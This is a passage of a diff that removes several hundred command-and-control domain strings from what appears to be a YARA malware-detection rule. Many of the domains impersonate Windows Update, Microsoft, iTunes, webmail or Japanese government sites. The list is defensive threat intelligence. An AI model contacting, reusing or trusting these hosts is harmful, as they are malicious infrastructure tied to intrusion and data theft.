-      $c2_255 = "ftp.balance1.wikaba.com" ascii
-      $c2_256 = "ftp.be.mrslove.com" ascii
-      $c2_257 = "ftp.brand.fartit.com" ascii
-      $c2_258 = "ftp.bulletproof.squirly.info" ascii
-      $c2_259 = "ftp.cia.ezua.com" ascii
-      $c2_260 = "ftp.cia.toh.info" ascii
-      $c2_261 = "ftp.civilwar123.authorizeddns.org" ascii
-      $c2_262 = "ftp.civilwar520.onmypc.org" ascii
-      $c2_263 = "ftp.cloudfileserverbs.dynamicdns.co.uk" ascii
-      $c2_264 = "ftp.cnnews.mylftv.com" ascii
-      $c2_265 = "ftp.commons.onedumb.com" ascii
-      $c2_266 = "ftp.contractus.qpoe.com" ascii
-      $c2_267 = "ftp.cvnx.zyns.com" ascii
-      $c2_268 = "ftp.de.onmypc.info" ascii
-      $c2_269 = "ftp.details.squirly.info" ascii
-      $c2_270 = "ftp.devilcase.acmetoy.com" ascii
-      $c2_271 = "ftp.disruptive.https443.net" ascii
-      $c2_272 = "ftp.domainnow.yourtrap.com" ascii
-      $c2_273 = "ftp.ea.onmypc.info" ascii
-      $c2_274 = "ftp.ehshiroshima.mylftv.com" ascii
-      $c2_275 = "ftp.eric-averyanov.wha.la" ascii
-      $c2_276 = "ftp.eu.acmetoy.com" ascii
-      $c2_277 = "ftp.eu.wha.la" ascii
-      $c2_278 = "ftp.eu.zzux.com" ascii
-      $c2_279 = "ftp.fbi.sexxxy.biz" ascii
-      $c2_280 = "ftp.file.zzux.com" ascii
-      $c2_281 = "ftp.findme.epac.to" ascii
-      $c2_282 = "ftp.fire.mrface.com" ascii
-      $c2_283 = "ftp.fjs.wikaba.com" ascii
-      $c2_284 = "ftp.fr.wikaba.com" ascii
-      $c2_285 = "ftp.fuck.ikwb.com" ascii
-      $c2_286 = "ftp.fuckmm.dns-dns.com" ascii
-      $c2_287 = "ftp.generat.almostmy.com" ascii
-      $c2_288 = "ftp.goldtoyota.com" ascii
-      $c2_289 = "ftp.goodmusic.justdied.com" ascii
-      $c2_290 = "ftp.helpus.ddns.info" ascii
-      $c2_291 = "ftp.hii.qhigh.com" ascii
-      $c2_292 = "ftp.innocent-isayev.sexidude.com" ascii
-      $c2_293 = "ftp.invoices.sexxxy.biz" ascii
-      $c2_294 = "ftp.iphone.vizvaz.com" ascii
-      $c2_295 = "ftp.itlans.isasecret.com" ascii
-      $c2_296 = "ftp.itunesdownload.jkub.com" ascii
-      $c2_297 = "ftp.itunesdownload.wikaba.com" ascii
-      $c2_298 = "ftp.itunesimages.itemdb.com" ascii
-      $c2_299 = "ftp.itunesimages.itsaol.com" ascii
-      $c2_300 = "ftp.itunesimages.qpoe.com" ascii
-      $c2_301 = "ftp.itunesmirror.fartit.com" ascii
-      $c2_302 = "ftp.itunesmirror.itsaol.com" ascii
-      $c2_303 = "ftp.itunesmusic.ikwb.com" ascii
-      $c2_304 = "ftp.itunesmusic.jetos.com" ascii
-      $c2_305 = "ftp.itunesmusic.jkub.com" ascii
-      $c2_306 = "ftp.itunesmusic.zzux.com" ascii
-      $c2_307 = "ftp.itunesupdate.itsaol.com" ascii
-      $c2_308 = "ftp.itunesupdates.organiccrap.com" ascii
-      $c2_309 = "ftp.japanfilmsite.ikwb.com" ascii
-      $c2_310 = "ftp.jimin.mymom.info" ascii
-      $c2_311 = "ftp.jp.serveuser.com" ascii
-      $c2_312 = "ftp.key.zzux.com" ascii
-      $c2_313 = "ftp.knowledge.sellclassics.com" ascii
-      $c2_314 = "ftp.lan.dynssl.com" ascii
-      $c2_315 = "ftp.latestnews.epac.to" ascii
-      $c2_316 = "ftp.latestnews.organiccrap.com" ascii
-      $c2_317 = "ftp.leedong.longmusic.com" ascii
-      $c2_318 = "ftp.macfee.mrface.com" ascii
-      $c2_319 = "ftp.maffc.mrface.com" ascii
-      $c2_320 = "ftp.malware.dsmtp.com" ascii
-      $c2_321 = "ftp.manager.jetos.com" ascii
-      $c2_322 = "ftp.martin.sellclassics.com" ascii
-      $c2_323 = "ftp.mason.vizvaz.com" ascii
-      $c2_324 = "ftp.mediapath.organiccrap.com" ascii
-      $c2_325 = "ftp.microsoft.got-game.org" ascii
-      $c2_326 = "ftp.microsoft.mrface.com" ascii
-      $c2_327 = "ftp.microsoftimages.organiccrap.com" ascii
-      $c2_328 = "ftp.microsoftmusic.mrbasic.com" ascii
-      $c2_329 = "ftp.microsoftqckmanager.pcanywhere.net" ascii
-      $c2_330 = "ftp.microsoftupdate.mrbasic.com" ascii
-      $c2_331 = "ftp.microsoftupdate.qhigh.com" ascii
-      $c2_332 = "ftp.micrsoftware.dsmtp.com" ascii
-      $c2_333 = "ftp.mircsoft.compress.to" ascii
-      $c2_334 = "ftp.mmy.ddns.us" ascii
-      $c2_335 = "ftp.mod.jetos.com" ascii
-      $c2_336 = "ftp.mofa.dynamic-dns.net" ascii
-      $c2_337 = "ftp.mofa.ns01.info" ascii
-      $c2_338 = "ftp.moscowdic.trickip.org" ascii
-      $c2_339 = "ftp.msg.ezua.com" ascii
-      $c2_340 = "ftp.musicfile.ikwb.com" ascii
-      $c2_341 = "ftp.musicjj.zzux.com" ascii
-      $c2_342 = "ftp.mymusicbox.vizvaz.com" ascii
-      $c2_343 = "ftp.myphpwebsite.itsaol.com" ascii
-      $c2_344 = "ftp.myrestroomimage.isasecret.com" ascii
-      $c2_345 = "ftp.na.americanunfinished.com" ascii
-      $c2_346 = "ftp.na.onmypc.org" ascii
-      $c2_347 = "ftp.newsdata.jkub.com" ascii
-      $c2_348 = "ftp.newsroom.cleansite.info" ascii
-      $c2_349 = "ftp.no.authorizeddns.org" ascii
-      $c2_350 = "ftp.nsa.mefound.com" ascii
-      $c2_351 = "ftp.nt.mynumber.org" ascii
-      $c2_352 = "ftp.nttdata.otzo.com" ascii
-      $c2_353 = "ftp.nz.compress.to" ascii
-      $c2_354 = "ftp.ol.almostmy.com" ascii
-      $c2_355 = "ftp.oracleupdate.dns04.com" ascii
-      $c2_356 = "ftp.portal.mrface.com" ascii
-      $c2_357 = "ftp.portal.sendsmtp.com" ascii
-      $c2_358 = "ftp.portalser.dynamic-dns.net" ascii
-      $c2_359 = "ftp.praskovya-matveyeva.mefound.com" ascii
-      $c2_360 = "ftp.praskovya-ulyanova.dumb1.com" ascii
-      $c2_361 = "ftp.products.almostmy.com" ascii
-      $c2_362 = "ftp.products.cleansite.us" ascii
-      $c2_363 = "ftp.products.serveuser.com" ascii
-      $c2_364 = "ftp.purchase.lflinkup.org" ascii
-      $c2_365 = "ftp.recent.dns-stuff.com" ascii
-      $c2_366 = "ftp.recent.fartit.com" ascii
-      $c2_367 = "ftp.referred.gr8domain.biz" ascii
-      $c2_368 = "ftp.referred.yourtrap.com" ascii
-      $c2_369 = "ftp.register.ourhobby.com" ascii
-      $c2_370 = "ftp.registration2.instanthq.com" ascii
-      $c2_371 = "ftp.registrations.4pu.com" ascii
-      $c2_372 = "ftp.registrations.organiccrap.com" ascii
-      $c2_373 = "ftp.remeberdata.iownyour.org" ascii
-      $c2_374 = "ftp.reserveds.onedumb.com" ascii
-      $c2_375 = "ftp.rethem.almostmy.com" ascii
-      $c2_376 = "ftp.sdmsg.onmypc.org" ascii
-      $c2_377 = "ftp.se.toythieves.com" ascii
-      $c2_378 = "ftp.secertnews.mrbasic.com" ascii
-      $c2_379 = "ftp.senseye.ikwb.com" ascii
-      $c2_380 = "ftp.senseye.mrbonus.com" ascii
-      $c2_381 = "ftp.septdlluckysystem.jungleheart.com" ascii
-      $c2_382 = "ftp.seraphim-yurieva.justdied.com" ascii
-      $c2_383 = "ftp.serv.justdied.com" ascii
-      $c2_384 = "ftp.server1.proxydns.com" ascii
-      $c2_385 = "ftp.seyesb.acmetoy.com" ascii
-      $c2_386 = "ftp.shugiin.jkub.com" ascii
-      $c2_387 = "ftp.singed.otzo.com" ascii
-      $c2_388 = "ftp.sstday.jkub.com" ascii
-      $c2_389 = "ftp.support1.mrface.com" ascii
-      $c2_390 = "ftp.supportus.mefound.com" ascii
-      $c2_391 = "ftp.svc.dynssl.com" ascii
-      $c2_392 = "ftp.synssl.dnset.com" ascii
-      $c2_393 = "ftp.tamraj.fartit.com" ascii
-      $c2_394 = "ftp.tfa.longmusic.com" ascii
-      $c2_395 = "ftp.thunder.wikaba.com" ascii
-      $c2_396 = "ftp.ticket.instanthq.com" ascii
-      $c2_397 = "ftp.ticket.serveuser.com" ascii
-      $c2_398 = "ftp.tokyofile.2waky.com" ascii
-      $c2_399 = "ftp.tophost.dynamicdns.co.uk" ascii
-      $c2_400 = "ftp.transfer.lflinkup.org" ascii
-      $c2_401 = "ftp.transfer.mrbasic.com" ascii
-      $c2_402 = "ftp.transfer.vizvaz.com" ascii
-      $c2_403 = "ftp.ugreen.itemdb.com" ascii
-      $c2_404 = "ftp.uk.dynamicdns.org.uk" ascii
-      $c2_405 = "ftp.un.ddns.info" ascii
-      $c2_406 = "ftp.un.dnsrd.com" ascii
-      $c2_407 = "ftp.usa.itsaol.com" ascii
-      $c2_408 = "ftp.well.itsaol.com" ascii
-      $c2_409 = "ftp.well.mrbasic.com" ascii
-      $c2_410 = "ftp.wike.wikaba.com" ascii
-      $c2_411 = "ftp.windowfile.itemdb.com" ascii
-      $c2_412 = "ftp.windowsimages.itemdb.com" ascii
-      $c2_413 = "ftp.windowsimages.qhigh.com" ascii
-      $c2_414 = "ftp.windowsmirrors.vizvaz.com" ascii
-      $c2_415 = "ftp.windowsupdate.2waky.com" ascii
-      $c2_416 = "ftp.windowsupdate.3-a.net" ascii
-      $c2_417 = "ftp.windowsupdate.authorizeddns.us" ascii
-      $c2_418 = "ftp.windowsupdate.dns05.com" ascii
-      $c2_419 = "ftp.windowsupdate.esmtp.biz" ascii
-      $c2_420 = "ftp.windowsupdate.ezua.com" ascii
-      $c2_421 = "ftp.windowsupdate.fartit.com" ascii
-      $c2_422 = "ftp.windowsupdate.gettrials.com" ascii
-      $c2_423 = "ftp.windowsupdate.instanthq.com" ascii
-      $c2_424 = "ftp.windowsupdate.jungleheart.com" ascii
-      $c2_425 = "ftp.windowsupdate.lflink.com" ascii
-      $c2_426 = "ftp.windowsupdate.mrface.com" ascii
-      $c2_427 = "ftp.windowsupdate.mylftv.com" ascii
-      $c2_428 = "ftp.windowsupdate.rebatesrule.net" ascii
-      $c2_429 = "ftp.windowsupdate.sellclassics.com" ascii
-      $c2_430 = "ftp.windowsupdate.serveusers.com" ascii
-      $c2_431 = "ftp.yandexr.sellclassics.com" ascii
-      $c2_432 = "fu.epac.to" ascii
-      $c2_433 = "fuck.ikwb.com" ascii
-      $c2_434 = "fuckanti.com" ascii
-      $c2_435 = "fuckdd.8800.org" ascii
-      $c2_436 = "fuckmm.8800.org" ascii
-      $c2_437 = "fuckmm.dns-dns.com" ascii
-      $c2_438 = "fukuoka.cloud-maste.com" ascii
-      $c2_439 = "g3ypf.online" ascii
-      $c2_440 = "gadskysun.com" ascii
-      $c2_441 = "gavin.ccfchrist.com" ascii
-      $c2_442 = "generat.almostmy.com" ascii
-      $c2_443 = "generousd.hopto.org" ascii
-      $c2_444 = "gensuzuki.6600.org" ascii
-      $c2_446 = "gh.mysecondarydns.com" ascii
-      $c2_447 = "gifuonlineshopping.mynumber.org" ascii
-      $c2_448 = "glicense.shenajou.com" ascii
-      $c2_449 = "globalnews.wikaba.com" ascii
-      $c2_450 = "gmail.com.mailsserver.com" ascii
-      $c2_451 = "gmpcw.com" ascii
-      $c2_452 = "gold.polopurple.com" ascii
-      $c2_453 = "goldtoyota.com" ascii
-      $c2_454 = "goodmusic.justdied.com" ascii
-      $c2_455 = "goodsampjp.com" ascii
-      $c2_456 = "gooesdataios.instanthq.com" ascii
-      $c2_457 = "google.macforlinux.net" ascii
-      $c2_458 = "google.usrobothome.com" ascii
-      $c2_459 = "googlemeail.com" ascii
-      $c2_460 = "gostudyantivirus.com" ascii
-      $c2_461 = "gostudymbaa.com" ascii
-      $c2_462 = "gotourisma.com" ascii
-      $c2_463 = "gt4study.com" ascii
-      $c2_464 = "gtsofta.com" ascii
-      $c2_465 = "haoyujd.info" ascii
-      $c2_466 = "happy.workerisgood.com" ascii
-      $c2_467 = "have8000.com" ascii
-      $c2_468 = "helpus.ddns.info" ascii
-      $c2_469 = "helshellfucde.8866.org" ascii
-      $c2_470 = "hg8fmv.racing" ascii
-      $c2_471 = "hii.qhigh.com" ascii
-      $c2_472 = "hk.2012yearleft.com" ascii
-      $c2_473 = "hk.cmdnetview.com" ascii
-      $c2_474 = "hk.have8000.com" ascii
-      $c2_475 = "hk.loveddos.com" ascii
-      $c2_476 = "home.trickip.org" ascii
-      $c2_477 = "hostport9.net" ascii
-      $c2_478 = "hotmai.info" ascii
-      $c2_479 = "hotmail.com.mailsserver.com" ascii
-      $c2_480 = "hukuoka.cloud-maste.com" ascii
-      $c2_481 = "iamges.itunesmusic.jkub.com" ascii
-      $c2_482 = "ibmmsg.strangled.net" ascii
-      $c2_483 = "icfeds.cf" ascii
-      $c2_484 = "idpmus.hostport9.net" ascii
-      $c2_486 = "im.suibian2010.info" ascii
-      $c2_487 = "image.websago.info" ascii
-      $c2_488 = "images.itunesmusic.jkub.com" ascii
-      $c2_489 = "images.thedomais.info" ascii
-      $c2_490 = "images.tyoto-go-jp.com" ascii
-      $c2_491 = "images.windowsupdate.organiccrap.com" ascii
-      $c2_492 = "imap.architectisusa.com" ascii
-      $c2_493 = "imap.dnset.com" ascii
-      $c2_494 = "imap.lflink.com" ascii
-      $c2_495 = "imap.onmypc.net" ascii
-      $c2_496 = "imap.ygto.com" ascii
-      $c2_497 = "img.station155.com" ascii
-      $c2_498 = "improvejpese.com" ascii
-      $c2_499 = "incloud-go.com" ascii
-      $c2_500 = "incloud-obert.com" ascii
-      $c2_501 = "ingemar.catholicmmb.com" ascii
-      $c2_502 = "innocent-isayev.sexidude.com" ascii
-      $c2_503 = "innov-tec.com.ua" ascii
-      $c2_504 = "inspgon.re26.com" ascii
-      $c2_505 = "interpreter.shenajou.com" ascii
-      $c2_506 = "invoices.sexxxy.biz" ascii
-      $c2_508 = "iphone.vizvaz.com" ascii
-      $c2_509 = "ipv4.applemusic.itemdb.com" ascii
-      $c2_510 = "ipv4.itunesmusic.jkub.com" ascii
-      $c2_511 = "ipv4.japanenvnews.qpoe.com" ascii
-      $c2_512 = "ipv4.microsoftmusic.onedumb.com" ascii
-      $c2_513 = "ipv4.microsoftupdate.mrbasic.com" ascii
-      $c2_514 = "ipv4.microsoftupdate.qhigh.com" ascii
-      $c2_515 = "ipv4.windowsupdate.3-a.net" ascii
-      $c2_516 = "ipv4.windowsupdate.authorizeddns.org" ascii
-      $c2_517 = "ipv4.windowsupdate.authorizeddns.us" ascii
-      $c2_518 = "ipv4.windowsupdate.dnset.com" ascii
-      $c2_519 = "ipv4.windowsupdate.esmtp.biz" ascii
-      $c2_520 = "ipv4.windowsupdate.ezua.com" ascii
-      $c2_521 = "ipv4.windowsupdate.fartit.com" ascii
-      $c2_522 = "ipv4.windowsupdate.gettrials.com" ascii
-      $c2_523 = "ipv4.windowsupdate.itsaol.com" ascii
-      $c2_524 = "ipv4.windowsupdate.lflink.com" ascii
-      $c2_525 = "ipv4.windowsupdate.lflinkup.com" ascii
-      $c2_526 = "ipv4.windowsupdate.mrface.com" ascii
-      $c2_527 = "ipv4.windowsupdate.mylftv.com" ascii
-      $c2_528 = "ipv4.windowsupdate.nsatcdns.com" ascii
-      $c2_529 = "ipv4.windowsupdate.x24hr.com" ascii
-      $c2_530 = "ipv6microsoft.dlmix.ourdvs.com" ascii
-      $c2_531 = "itlans.isasecret.com" ascii
-      $c2_532 = "itunesdownload.jkub.com" ascii
-      $c2_533 = "itunesdownload.vizvaz.com" ascii
-      $c2_534 = "itunesdownload.wikaba.com" ascii
-      $c2_535 = "itunesimages.itemdb.com" ascii
-      $c2_536 = "itunesimages.itsaol.com" ascii
-      $c2_537 = "itunesimages.qpoe.com" ascii
-      $c2_538 = "itunesmirror.fartit.com" ascii
-      $c2_539 = "itunesmirror.itsaol.com" ascii
-      $c2_540 = "itunesmusic.ikwb.com" ascii
-      $c2_541 = "itunesmusic.jetos.com" ascii
-      $c2_542 = "itunesmusic.jkub.com" ascii
-      $c2_543 = "itunesmusic.zzux.com" ascii
-      $c2_544 = "itunesupdate.itsaol.com" ascii
-      $c2_545 = "itunesupdates.organiccrap.com" ascii
-      $c2_546 = "iw.mrslove.com" ascii
-      $c2_547 = "ixrayeye.com" ascii
-      $c2_548 = "james.tffghelth.com" ascii
-      $c2_549 = "janpan.bigmoney.biz" ascii
-      $c2_550 = "janpun.americanunfinished.com" ascii
-      $c2_551 = "jap.japanmusicinfo.com" ascii
-      $c2_552 = "japan.fuckanti.com" ascii
-      $c2_553 = "japan.linuxforover.com" ascii
-      $c2_554 = "japan.loveddos.com" ascii
-      $c2_555 = "japanenvnews.qpoe.com" ascii
-      $c2_556 = "japanfilmsite.ikwb.com" ascii
-      $c2_557 = "japanfst.japanteam.org" ascii
-      $c2_558 = "japanmusicinfo.com" ascii
-      $c2_559 = "japanteam.org" ascii
-      $c2_560 = "jcie.mofa.ns01.info" ascii
-      $c2_561 = "jepsen.r3u8.com" ascii
-      $c2_562 = "jica-go-jp.bike" ascii
-      $c2_563 = "jica-go-jp.biz" ascii
-      $c2_564 = "jimin-jp.biz" ascii
-      $c2_565 = "jimin.jimindaddy.com" ascii
-      $c2_566 = "jimin.mymom.info" ascii
-      $c2_567 = "jimindaddy.com" ascii
-      $c2_568 = "jimingroup.com" ascii
-      $c2_569 = "jimintokoy.com" ascii
-      $c2_570 = "jj.mysecondarydns.com" ascii
-      $c2_571 = "jmuroran.com" ascii
-      $c2_572 = "jp.rakutenmusic.com" ascii
-      $c2_573 = "jp.serveuser.com" ascii
-      $c2_574 = "jpcert.org" ascii
-      $c2_575 = "jpn.longmusic.com" ascii
-      $c2_576 = "jpnxzshopdata.authorizeddns.org" ascii
-      $c2_577 = "jpstarmarket.serveusers.com" ascii
-      $c2_578 = "kaka.lehigtapp.com" ascii
-      $c2_579 = "kawasaki.cloud-maste.com" ascii
-      $c2_580 = "kawasaki.unhamj.com" ascii
-      $c2_581 = "kennedy.tffghelth.com" ascii
-      $c2_582 = "key.zzux.com" ascii
-      $c2_583 = "kikimusic.sellclassics.com" ascii
-      $c2_584 = "kmd.crabdance.com" ascii
-      $c2_585 = "knowledge.sellclassics.com" ascii
-      $c2_586 = "ktgmktanxgvn.r3u8.com" ascii
-      $c2_587 = "kxsbwappupdate.dhcp.biz" ascii
-      $c2_588 = "kztmusiclnk.dnsrd.com" ascii
-      $c2_589 = "lan.dynssl.com" ascii
-      $c2_590 = "last.p6p6.net" ascii
-      $c2_591 = "latestnews.epac.to" ascii
-      $c2_592 = "latestnews.organiccrap.com" ascii
-      $c2_593 = "leedong.longmusic.com" ascii
-      $c2_594 = "lehigtapp.com" ascii
-      $c2_595 = "lennon.fftpoor.com" ascii
-      $c2_596 = "license.shenajou.com" ascii
-      $c2_597 = "lie.jetos.com" ascii
-      $c2_598 = "linuxforover.com" ascii
-      $c2_599 = "linuxsofta.com" ascii
-      $c2_600 = "lion.wchildress.com" ascii
-      $c2_601 = "lizard.poulsenv.com" ascii
-      $c2_602 = "logon-live.com" ascii
-      $c2_603 = "lottedfstravel.webbooting.com" ascii
-      $c2_604 = "loveddos.com" ascii
-      $c2_605 = "lzf550.r3u8.com" ascii
-      $c2_606 = "ma.vizvaz.com" ascii
-      $c2_607 = "mac.goldtoyota.com" ascii
-      $c2_608 = "mac.methoder.com" ascii
-      $c2_609 = "macfee.mrface.com" ascii
-      $c2_610 = "macforlinux.net" ascii
-      $c2_611 = "maffc.mrface.com" ascii
-      $c2_612 = "mail.architectisusa.com" ascii
-      $c2_613 = "mail.macforlinux.net" ascii
-      $c2_614 = "mailcarriage.co.uk" ascii
-      $c2_615 = "mailj.hostport9.net" ascii
-      $c2_616 = "mailserever.com" ascii
-      $c2_617 = "mailsserver.com" ascii
-      $c2_618 = "mailvserver.com" ascii
-      $c2_619 = "malcolm.fftpoor.com" ascii
-      $c2_620 = "malware.dsmtp.com" ascii
-      $c2_621 = "manager.architectisusa.com" ascii
-      $c2_622 = "manager.jetos.com" ascii
-      $c2_623 = "markabcinfo.dynamicdns.me.uk" ascii
-      $c2_624 = "martin.sellclassics.com" ascii
-      $c2_625 = "mason.vizvaz.com" ascii
-      $c2_626 = "mbaby.macforlinux.net" ascii
-      $c2_627 = "medexplor.thedomais.info" ascii
-      $c2_628 = "mediapath.organiccrap.com" ascii
-      $c2_629 = "meiji-ac-jp.com" ascii
-      $c2_630 = "mesjm.emailfound.info" ascii
-      $c2_631 = "message.emailfound.info" ascii
-      $c2_632 = "message.p6p6.net" ascii
-      $c2_633 = "messagea.emailfound.info" ascii
-      $c2_634 = "methoder.com" ascii
-      $c2_635 = "mf.ddns.info" ascii
-      $c2_636 = "microcnmlgb.3322.org" ascii
-      $c2_637 = "microdef.2288.org" ascii
-      $c2_638 = "microhome.wikaba.com" ascii
-      $c2_639 = "microsoft.got-game.org" ascii
-      $c2_640 = "microsoft.mrface.com" ascii
-      $c2_641 = "microsoftdownload.zzux.com" ascii
-      $c2_642 = "microsoftempowering.sendsmtp.com" ascii
-      $c2_643 = "microsoften.com" ascii
-      $c2_644 = "microsoftgame.mrface.com" ascii
-      $c2_645 = "microsoftgetstarted.sexidude.com" ascii
-      $c2_646 = "microsoftimages.organiccrap.com" ascii
-      $c2_647 = "microsoftmirror.mrbasic.com" ascii
-      $c2_648 = "microsoftmusic.itemdb.com" ascii
-      $c2_649 = "microsoftmusic.mrbasic.com" ascii
-      $c2_650 = "microsoftmusic.onedumb.com" ascii
-      $c2_651 = "microsoftqckmanager.pcanywhere.net" ascii
-      $c2_652 = "microsoftstore.jetos.com" ascii
-      $c2_653 = "microsoftstores.itemdb.com" ascii
-      $c2_654 = "microsoftupdate.mrbasic.com" ascii
-      $c2_655 = "microsoftupdate.qhigh.com" ascii
-      $c2_656 = "microsoftupdates.vizvaz.com" ascii
-      $c2_657 = "micrsoftware.dsmtp.com" ascii
-      $c2_658 = "mircsoft.compress.to" ascii
-      $c2_659 = "mivsee.website0012.net" ascii
-      $c2_660 = "mmofoojap.2288.org" ascii
-      $c2_661 = "mmy.ddns.us" ascii
-      $c2_662 = "mobile.2waky.com" ascii
-      $c2_663 = "mocha.100fanwen.com" ascii
-      $c2_664 = "mod.jetos.com" ascii
-      $c2_665 = "mofa-go-jp.com" ascii
-      $c2_666 = "mofa.dynamic-dns.net" ascii
-      $c2_667 = "mofa.ns01.info" ascii
-      $c2_668 = "mofa.strangled.net" ascii
-      $c2_669 = "mofaess.com" ascii
-      $c2_670 = "mongoles.3322.org" ascii
-      $c2_671 = "monkey.2012yearleft.com" ascii
-      $c2_672 = "moscowstdsupdate.toythieves.com" ascii
-      $c2_673 = "mrsloveaqx.mrslove.com" ascii
-      $c2_674 = "ms.ecc.u-tokyo-ac-jp.com" ascii
-      $c2_675 = "mseupdate.ourhobby.com" ascii
-      $c2_676 = "msg.ezua.com" ascii
-      $c2_677 = "msn.incloud-go.com" ascii
-      $c2_678 = "muller.exprenum.com" ascii
-      $c2_679 = "music.applemusic.itemdb.com" ascii
-      $c2_680 = "music.cleansite.us" ascii
-      $c2_681 = "music.websegoo.net" ascii
-      $c2_682 = "musicfile.ikwb.com" ascii
-      $c2_683 = "musicinfo.everydayfilmlink.com" ascii
-      $c2_684 = "musiclinker.jkub.com" ascii
-      $c2_685 = "musicsecph.squirly.info" ascii
-      $c2_686 = "mx.yetrula.eu" ascii
-      $c2_687 = "myie12.com" ascii
-      $c2_688 = "mymusicbox.lflinkup.org" ascii
-      $c2_689 = "mymusicbox.vizvaz.com" ascii
-      $c2_690 = "myphpwebsite.itsaol.com" ascii
-      $c2_691 = "myrestroomimage.isasecret.com" ascii
-      $c2_692 = "mytwhomeinst.sendsmtp.com" ascii
-      $c2_693 = "myurinikoreaaps.ninth.biz" ascii
-      $c2_694 = "na.americanunfinished.com" ascii
-      $c2_695 = "na.onmypc.org" ascii
-      $c2_696 = "nasa.xxuz.com" ascii
-      $c2_697 = "nec.website0012.net" ascii
-      $c2_698 = "news.100fanwen.com" ascii
-      $c2_699 = "newsdata.jkub.com" ascii
-      $c2_700 = "newsfile.toythieves.com" ascii
-      $c2_701 = "newsreport.justdied.com" ascii
-      $c2_702 = "newsroom.cleansite.info" ascii
-      $c2_703 = "nezwq.ezua.com" ascii
-      $c2_704 = "ngcc.8800.org" ascii
-      $c2_705 = "niushenghuo.info" ascii
-      $c2_706 = "nk10.belowto.com" ascii
-      $c2_707 = "nk20.belowto.com" ascii
-      $c2_708 = "nlddnsinfo.https443.org" ascii
-      $c2_709 = "nmrx.mrbonus.com" ascii
-      $c2_710 = "nn.dynssl.com" ascii
-      $c2_711 = "no.authorizeddns.org" ascii
-      $c2_712 = "node.mofaess.com" ascii
-      $c2_713 = "nodns2.qipian.org" ascii
-      $c2_714 = "nposnewsinfo.qhigh.com" ascii
-      $c2_715 = "ns1.belowto.com" ascii
-      $c2_716 = "ns1.tlchs2.ml" ascii
-      $c2_717 = "ns2.belowto.com" ascii
-      $c2_718 = "ns21.belowto.com" ascii
-      $c2_719 = "ns22.belowto.com" ascii
-      $c2_720 = "ns4.belowto.com" ascii
-      $c2_721 = "ns5.belowto.com" ascii
-      $c2_722 = "nsa.mefound.com" ascii
-      $c2_723 = "nsatcdns.com" ascii
-      $c2_724 = "nt.mynumber.org" ascii
-      $c2_725 = "nttdata.otzo.com" ascii
-      $c2_726 = "nunluck.re26.com" ascii
-      $c2_727 = "nz.compress.to" ascii
-      $c2_728 = "oipbl.com" ascii
-      $c2_729 = "ol.almostmy.com" ascii
-      $c2_730 = "oldbmwy.com" ascii
-      $c2_731 = "oms.sindeali.com" ascii
-      $c2_732 = "openmofa.8866.org" ascii
-      $c2_733 = "oracleupdate.dns04.com" ascii
-      $c2_734 = "osaka-jpgo.com" ascii
-      $c2_735 = "outlook.otzo.com" ascii
-      $c2_736 = "owlmedia.mefound.com" ascii
-      $c2_737 = "p6p6.net" ascii
-      $c2_738 = "peopleinfodata.3-a.net" ascii
-      $c2_739 = "phptecinfohelp.itemdb.com" ascii
-      $c2_740 = "pictures.everydayfilmlink.com" ascii
-      $c2_741 = "pj.qpoe.com" ascii
-      $c2_742 = "points.mofaess.com" ascii
-      $c2_743 = "polopurple.com" ascii
-      $c2_744 = "pop.architectisusa.com" ascii
-      $c2_745 = "pop.loveddos.com" ascii
-      $c2_746 = "portal.mrface.com" ascii
-      $c2_747 = "portal.sendsmtp.com" ascii
-      $c2_748 = "portalser.dynamic-dns.net" ascii
-      $c2_749 = "poulsenv.com" ascii
-      $c2_750 = "praskovya-matveyeva.mefound.com" ascii
-      $c2_751 = "praskovya-ulyanova.dumb1.com" ascii
-      $c2_752 = "premium.redforlinux.com" ascii
-      $c2_753 = "products.almostmy.com" ascii
-      $c2_754 = "products.cleansite.us" ascii
-      $c2_755 = "products.serveuser.com" ascii
-      $c2_756 = "program.acmetoy.com" ascii
-      $c2_757 = "prrmes4019.r3u8.com" ascii
-      $c2_758 = "purchase.lflinkup.org" ascii
-      $c2_759 = "q6.niushenghuo.info" ascii
-      $c2_760 = "qtsofta.com" ascii
-      $c2_761 = "quick.oldbmwy.com" ascii
-      $c2_762 = "r3u8.com" ascii
-      $c2_763 = "radiorig.com" ascii
-      $c2_764 = "rain.orctldl.windowsupdate.authorizeddns.us" ascii
-      $c2_765 = "rakutenmusic.com" ascii
-      $c2_766 = "rdns-4.infoproduto1.tk" ascii
-      $c2_767 = "re26.com" ascii
-      $c2_768 = "read.xxuz.com" ascii
-      $c2_769 = "recent.dns-stuff.com" ascii
-      $c2_770 = "recent.fartit.com" ascii
-      $c2_771 = "record.hostport9.net" ascii
-      $c2_772 = "record.webssl9.info" ascii
-      $c2_773 = "record.wschandler.com" ascii
-      $c2_774 = "redforlinux.com" ascii
-      $c2_775 = "referred.gr8domain.biz" ascii
-      $c2_776 = "referred.yourtrap.com" ascii
-      $c2_777 = "register.ourhobby.com" ascii
-      $c2_778 = "registration2.instanthq.com" ascii
-      $c2_779 = "registrations.4pu.com" ascii
-      $c2_780 = "registrations.organiccrap.com" ascii
-      $c2_781 = "reports.tomorrowforgood.com" ascii
-      $c2_782 = "reserveds.onedumb.com" ascii
-      $c2_783 = "resources.applemusic.itemdb.com" ascii
-      $c2_784 = "rethem.almostmy.com" ascii
-      $c2_785 = "rg197.win" ascii
-      $c2_786 = "rlbeiydn.hi.r3u8.com" ascii
-      $c2_787 = "saiyo.exprenum.com" ascii
-      $c2_788 = "sakai.unhamj.com" ascii
-      $c2_789 = "salvaiona.com" ascii
-      $c2_790 = "sappore.cloud-maste.com" ascii
-      $c2_791 = "sapporo.cloud-maste.com" ascii
-      $c2_792 = "sapporot.com" ascii
-      $c2_793 = "sat.suayay.com" ascii
-      $c2_794 = "saverd.re26.com" ascii
-      $c2_795 = "sbuudd.webssl9.info" ascii
-      $c2_796 = "sc.weboot.info" ascii
-      $c2_797 = "scholz-versand.com" ascii
-      $c2_798 = "scorpion.poulsenv.com" ascii
-      $c2_799 = "scrlk.exprenum.com" ascii
-      $c2_800 = "sdmsg.onmypc.org" ascii
-      $c2_801 = "se.toythieves.com" ascii
-      $c2_802 = "sea.websegoo.net" ascii
-      $c2_803 = "secertnews.mrbasic.com" ascii
-      $c2_804 = "secmicrosooo.6600.org" ascii
-      $c2_805 = "secnetshit.com" ascii
-      $c2_806 = "secserverupdate.toh.info" ascii
-      $c2_807 = "sell.mofaess.com" ascii
-      $c2_808 = "sema.linuxsofta.com" ascii
-      $c2_809 = "send.have8000.com" ascii
-      $c2_810 = "send.mofa.ns01.info" ascii
